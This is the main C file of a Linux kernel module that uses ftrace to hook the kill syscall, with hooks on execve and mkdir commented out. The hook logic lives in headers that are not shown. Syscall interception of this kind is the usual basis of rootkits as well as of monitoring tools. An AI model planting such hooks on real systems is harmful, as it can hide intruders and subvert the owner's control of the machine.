#include "execve.h"
#include "hook.h"
#include "kill.h"
#include "mkdir.h"

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");

#if !(defined(CONFIG_X86_64) && LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#error "only x86_64 builds against kernels >= 4.17.0 supported"
// For kernels < 4.17.0 the syscall function declarations did not use struct pt_regs
#endif

struct hook hooks[] = {
    // TODO The mkdir syscall impl. either inherently uses recursion or otherwise has some unique aspect that causes infinite ftrace-based recursion
    //{ .name = "__x64_sys_mkdir", .func = mkdir_hook, .orig_ptr = (void **)&mkdir_orig },
    //{ .name = "__x64_sys_execve", .func = execve_hook, .orig_ptr = (void **)&execve_orig },
    
    { .name = "__x64_sys_kill", .func = kill_hook, .orig_ptr = (void **)&kill_orig },
};

static int __init init(void) {
    int i, j;

    for (i = 0, j = -2; i < sizeof(hooks) / sizeof(*hooks); i++) {
        if (hook_init(&hooks[i]) != 0) {
            j = i - 1;
            break;
        }
    }

    if (j > -2) {
        for (i = j; i >= 0; i--)
            hook_deinit(&hooks[i]);
        return -1;
    }

    printk(KERN_INFO "init successful");
    return 0;
}

static void __exit exit2(void) {
    int i;

    for (i = sizeof(hooks) / sizeof(*hooks) - 1; i >= 0; i--)
        hook_deinit(&hooks[i]);
}

module_init(init);
module_exit(exit2);
